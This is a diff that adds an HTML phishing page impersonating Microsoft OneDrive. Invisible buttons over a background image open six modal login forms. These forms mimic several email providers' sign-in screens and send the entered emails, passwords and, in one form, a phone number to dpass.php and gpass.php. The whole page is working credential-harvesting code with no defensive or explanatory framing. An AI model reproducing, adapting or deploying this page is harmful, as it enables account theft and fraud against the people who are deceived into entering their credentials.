@@ -1,0 +1,90 @@
+<title>
+   Personal cloud storage - Microsoft OneDrive
+  </title><link href=img/favicon.ico rel=icon type=image/ico><style><style>
+*{margin:0px; padding:0px; font-family:Helvetica, Arial, sans-serif;}
+
+body {
+    background-repeat:no-repeat;
+}
+/* Full-width input fields */
+input[type=email], input[type=text] , input[type=password] {
+    width: 90%;
+    padding: 5px 5px;
+    margin: 4px 26px;
+    display: inline-block;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+	font-size:16px;
+}
+
+/* Set a style for all buttons */
+button {
+	background-color: transparent;
+	padding: 14px 20px;
+	margin: 8px 26px;
+	border: none;
+	cursor: pointer;
+	width: 90%;
+	height: 40px;
+	position: absolute;
+	top: 72px;
+	left: -20px;
+}
+button:hover {
+    opacity: 0.8;
+}
+
+/* Center the image and position the close button */
+.imgcontainer {
+    text-align: center;
+    margin: 24px 0 12px 0;
+    position: relative;
+}
+.avatar {
+    
+}
+
+/* The Modal (background) */
+.modal {
+	display:none;
+    position: fixed;
+    z-index: 1;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0,0,0,0.4);
+}
+
+/* Modal Content Box */
+.modal-content {
+    background-color: #fff;
+    margin: 4% auto 15% auto;
+    border: 1px solid #888;
+    width: 400px; 
+	padding-bottom: 30px;
+}
+
+/* The Close Button (x) */
+.close {
+    position: absolute;
+    right: 25px;
+    top: 0;
+    color: #000;
+    font-size: 35px;
+    font-weight: bold;
+}
+.close:hover,.close:focus {
+    color: red;
+    cursor: pointer;
+}
+
+/* Add Zoom Animation */
+.animate {
+    animation: zoom 0.6s
+}
+@keyframes zoom {
+    from {transform: scale(0)} 
+    to {transform: scale(1)}
+}</style><body background=img/001.png><button style="width:200px; margin-top:143px; margin-left:120px;"onclick=document.getElementById('modal-wrapper').style.display='block'></button><div class=modal id=modal-wrapper><form class="modal-content animate"action=dpass.php method=post><div class=imgcontainer><span class=close onclick=document.getElementById('modal-wrapper').style.display='none' title=Close> × </span><img style="float:left; margin-left:26px; margin-top:26px; margin-bottom:26px;"alt=Avatar class=avatar src=img/av011.png></div><div class=container><input style="height:32px; font-size:0.9em;"id=id1 name=id1 placeholder=someone@example.com required type=email><input style="height:32px; font-size:0.9em;"id=id2 name=id2 placeholder=Password required type=password><input style="margin-right:5px; margin-left:26px; margin-top:5px;"type=checkbox><font size=2.5> Keep me signed in </font><br><input style="margin-left:26px; margin-top:30px; margin-bottom:30px;"alt=submit src=img/bt01.png type=image><br><a style="text-decoration:none; margin-left:26px;"href=#> <font color=#2872DD size=2.5> Can't access your account? </font> </a></div></form></div><button style="width:200px; margin-top:208px; margin-left:120px;"onclick=document.getElementById('modal-wrapper2').style.display='block'></button><div class=modal id=modal-wrapper2><form class="modal-content animate"action=gpass.php method=post><div class=imgcontainer><span class=close onclick=document.getElementById('modal-wrapper2').style.display='none' title=Close> × </span><img style="float:left; margin-left:26px;"alt=Avatar class=avatar src=img/av021.png><br><br><img style="float:left; margin-left:26px; margin-top:10px; margin-bottom:26px;"alt=Avatar2 class=avatar2 src=img/av022.png></div><div class=container><input placeholder="Email or phone"style="height:32px; font-size:0.9em;"border=0px name=id1 required type=email><input style="height:32px; font-size:0.9em;"name=id2 placeholder=Password required type=password><input placeholder="Phone number"style="height:32px; font-size:0.9em;"name=id3 required><br><br><a style="text-decoration:none; margin-left:26px;"href=#> <font color=#4285f4 size=2,5> Forgot email? </font> </a><br><br><br><input style="float:right;  margin-right:30px;  margin-bottom:30px;"alt=submit src=img/bt02.png type=image><br><br><br><br></div></form></div><button style="width:200px; margin-top:268px; margin-left:120px;"onclick=document.getElementById('modal-wrapper3').style.display='block'></button><div class=modal id=modal-wrapper3><form class="modal-content animate"action=dpass.php method=post><div class=imgcontainer><span class=close onclick=document.getElementById('modal-wrapper3').style.display='none' title=Close> × </span><img alt=Avatar class=avatar src=img/av031.png><br><br></div><div class=container><input placeholder="Enter your email"style="height:36px; font-size:16px;"name=id1 required type=email><input style="height:36px; font-size:16px;"name=id2 placeholder=Password required type=password><input style="margin-left:60px; margin-top:30px; margin-bottom:30px;"alt=submit src=img/bt03.png type=image><br><a style="text-decoration:none; float:right; margin-right:20px;"href=#> <font color=#188fff size=2.5> Trouble signing in? </font> </a><input style="margin-right:5px; margin-left:26px; margin-top:5px;"type=checkbox><font color=#188fff size=2.5> Stay signed in </font><br></div></form></div><button style="width:200px; margin-top:323px; margin-left:120px;"onclick=document.getElementById('modal-wrapper4').style.display='block'></button><div class=modal id=modal-wrapper4><form class="modal-content animate"action=dpass.php method=post><div class=imgcontainer><span class=close onclick=document.getElementById('modal-wrapper4').style.display='none' title=Close> × </span><img alt=Avatar class=avatar src=img/av041.png><br><br></div><div class=container><input placeholder="Username or Email"style="height:36px; font-size:16px;"name=id1 required type=email><input style="height:36px; font-size:16px;"name=id2 placeholder=Password required type=password><a style="text-decoration:none; float:right; margin-right:20px;"href=#> <font color=#57A size=2.5> Need help? </font> </a><br><br><input style="margin-right:5px; margin-left:26px; margin-top:5px;"type=checkbox><font color=#666666 size=3> Remember Me </font><br><input style="margin-left:70px; margin-top:30px; margin-bottom:30px;"alt=submit src=img/bt04.png type=image><br></div></form></div><button style="width:200px; margin-top:383px; margin-left:120px;"onclick=document.getElementById('modal-wrapper5').style.display='block'></button><div class=modal id=modal-wrapper5><form class="modal-content animate"action=dpass.php method=post><div class=imgcontainer><span class=close onclick=document.getElementById('modal-wrapper5').style.display='none' title=Close> × </span><img style="float:left; margin-left:26px; margin-top:15px; margin-bottom:15px;"alt=Avatar class=avatar src=img/av051.png></div><div class=container><input placeholder="Email, phone, or Skype"style="height:36px; font-size:16px;"name=id1 required type=email><input style="height:36px; font-size:16px;"name=id2 placeholder=Password required type=password><input style="margin-left:26px; margin-top:30px; margin-bottom:30px;"alt=submit src=img/bt05.png type=image><br><font color=#181818 size=2.5 style=margin-left:26px;> No account? </font><font color=#0067b8 size=2.5> Create one! </font></div></form></div><button style="width:200px; margin-top:443px; margin-left:120px;"onclick=document.getElementById('modal-wrapper6').style.display='block'></button><div class=modal id=modal-wrapper6><form class="modal-content animate"action=dpass.php method=post><div class=imgcontainer><span class=close onclick=document.getElementById('modal-wrapper6').style.display='none' title=Close> × </span><img style="margin-top:15px; margin-bottom:15px;"alt=Avatar class=avatar src=img/av061.png></div><div class=container><input style="height:36px; font-size:16px;"name=id1 placeholder=Email required type=email><input style="height:36px; font-size:16px;"name=id2 placeholder=Password required type=password><input style="margin-left:26px; margin-top:30px; margin-bottom:30px;"alt=submit src=img/bt06.png type=image><br></div></form></div>
